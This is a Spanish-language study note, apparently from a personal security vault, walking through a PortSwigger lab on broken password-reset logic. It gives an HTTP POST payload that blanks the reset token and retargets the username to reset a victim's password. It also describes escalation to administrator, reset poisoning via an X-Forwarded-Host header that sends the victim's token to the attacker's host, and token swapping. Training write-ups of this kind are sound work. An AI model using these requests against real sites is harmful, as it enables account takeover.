---
aliases:
  - Authentication 004 - password reset con lógica rota
  - password reset broken logic
tags:
  - vuln/authentication
  - example
  - portswigger
---

# 004 — Password reset con lógica rota (token no validado)

> Lab: [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic) · **Apprentice** · técnica → [[vulnerabilities/029-authentication/authentication|entry point]]

## ¿Por qué acá? (tomar la cuenta sin password)
- **Ni creds ni 2FA:** atacás el **flujo de recuperación**, que suele ser el flanco más flojo. Es el equivalente en Stage 2 apuntando a **admin** (misma técnica, otro `username`).
- **Por qué funciona:** el `POST` que setea la password nueva lleva un **`temp-forgot-password-token` + `username`**. Si el server **no valida** el token (o no lo ata al usuario), **borrás el token** y cambiás `username` a la víctima → la password se resetea igual → tomás la cuenta **sin token**.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (host, usuario objetivo, password nueva) + el **payload** (el token vaciado / `username` cambiado).

Pedí un reset de **tu** cuenta, seguí el link del mail y en el `POST /forgot-password` final **vaciá el token** y apuntá a la víctima:
<pre class="payload"><code>POST /forgot-password?temp-forgot-password-token=<mark></mark> HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark>
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=<mark></mark>&username=<mark>carlos</mark>&new-password-1=<mark>hacked</mark>&new-password-2=<mark>hacked</mark></code></pre>
(Vaciás el token **en la query y en el body**, o borrás el parámetro entero.)

## Verificación
Logueás como `carlos` con la password que pusiste → lab resuelto. Si el server aceptó el reset con **token vacío**, la lógica está rota.

## Detalles que se pasan por alto
- **Stage 1 → Stage 2:** la misma técnica con `username=administrator` escala a admin.
- Variantes del mismo flanco:
  - **Reset poisoning:** `X-Forwarded-Host: TU-collab` en el `/forgot-password` → el link del mail se arma con tu host y **el token de la víctima te llega** ([Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)).
  - **Tokens cruzados:** tu token **válido** + cambiar `username` al admin en el POST final.
- Si en vez de reset el flanco es el **cambio de password**, el oráculo es `New passwords do not match` ([Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)).

→ Fin de la cadena core. Volvé al [[vulnerabilities/029-authentication/authentication|entry point]] para las variantes (poisoning, tokens cruzados, brute por cambio de password).
